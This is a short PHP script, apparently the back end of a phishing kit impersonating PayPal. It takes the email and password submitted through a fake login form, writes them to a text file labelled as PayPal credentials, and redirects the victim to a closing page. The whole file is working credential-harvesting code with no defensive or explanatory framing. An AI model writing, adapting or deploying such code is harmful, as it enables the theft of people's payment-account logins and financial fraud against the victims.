<?php

file_put_contents("usernames.txt", "PayPal Username: " . $_POST['login_email'] . "\nPayPal Password: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: end.html');
exit();
?>